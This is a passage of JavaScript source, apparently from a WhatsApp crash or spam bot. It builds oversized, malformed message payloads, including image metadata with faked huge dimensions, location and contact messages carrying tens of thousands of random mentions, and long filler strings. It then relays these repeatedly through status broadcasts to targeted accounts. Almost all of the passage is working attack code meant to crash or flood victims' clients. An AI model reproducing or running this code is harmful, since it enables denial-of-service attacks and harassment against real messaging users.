            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
            fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
            mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
            fileLength: "99999999",
            height: 9999,
            width: 9999,
            directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1785637793",
            jpegThumbnail: "R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==",
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                mentionedJid: Array.from({ length: 1000 }, () => 
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
            }
        }
    };

    const mentionList = Array.from({ length: 5000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    const trackPayload = {
        locationMessage: {
            degreesLatitude: -6.200000,
            degreesLongitude: 106.816666,
            name: "Location " + "A".repeat(500),
            address: "Address " + "A".repeat(500),
            url: "https://maps.google.com/?q=-6.200000,106.816666",
            isLive: true,
            accuracyInMeters: 1,
            speedInMps: 0,
            degreesClockwiseFromMagneticNorth: 0,
            comment: "Track " + "A".repeat(1000),
            jpegThumbnail: "A".repeat(5000),
            contextInfo: {
                mentionedJid: mentionList,
                isForwarded: true,
                forwardingScore: 999999999,
                url: "https://mmg.whatsapp.net/v/t62.7119-24/fake_url.enc",
                directPath: "/v/t62.7119-24/fake_url_path",
                mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
                fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
                fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
                fileLength: 999999999,
                mediaKeyTimestamp: "1785637793",
                mimetype: "application/vnd.google-earth.kml+xml",
                caption: "Location Track " + "A".repeat(1000)
            }
        }
    };

    const stickerData = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/webp",
        height: 512,
        width: 512
    };

    const contactPayload = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "Rena",
                    vcard: `BEGIN:VCARD
VERSION:3.0
FN:RenaOffc
TEL;type=CELL;type=VOICE;waid=6287878064688:+62 878-7806-4688
END:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const basePayloads = [
        proto.Message.encode(proto.Message.fromObject(albumPayload)).finish(),
        proto.Message.encode(proto.Message.fromObject(docPayload)).finish(),
        proto.Message.encode(proto.Message.fromObject(statusPayload)).finish(),
        proto.Message.encode(proto.Message.fromObject(trackPayload)).finish(),
        proto.Message.encode(proto.Message.fromObject({ stickerMessage: stickerData })).finish(),
        proto.Message.encode(proto.Message.fromObject(contactPayload)).finish()
    ];

    let totalSent = 0;
    const TOTAL_PESAN = 10;
    const MAX_BATCH = 5;
    const DELAY_MS = 3000;

    for (let i = 0; i < jids.length; i++) {
        for (let loop = 0; loop < TOTAL_PESAN; loop++) {
            for (let pi = 0; pi < basePayloads.length; pi++) {
                const basePayload = basePayloads[pi];
                for (let ti = 0; ti < TAGS.length; ti++) {
                    const tag = TAGS[ti];
                    const payload = getDecodedPayload(basePayload, tag);
                    if (payload) {
                        try {
                            await sock.relayMessage('status@broadcast', payload, {
                                messageId: 'ultra_' + Date.now().toString(36).toUpperCase() + '_' + loop + '_' + pi + '_' + ti,
                                statusJidList: [jids[i]],
                                additionalNodes: [{
                                    tag: 'meta',
                                    attrs: {},
                                    content: [{
                                        tag: 'mentioned_users',
                                        attrs: {},
                                        content: [{ tag: 'to', attrs: { jid: jids[i] }, content: [] }]
                                    }]
                                }]
                            });
                            totalSent++;
                        } catch (_) {}
                    }
                }
            }
            await new Promise(r => setTimeout(r, 100));
        }
        
        if (i < jids.length - 1) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }
    }

    if (!totalSent) throw new Error('No messages sent');
    return { success: true, totalSent: totalSent, target: jids };
}





//=== JANGAN DI HAPUS YE JELEK ==== //
bot.launch()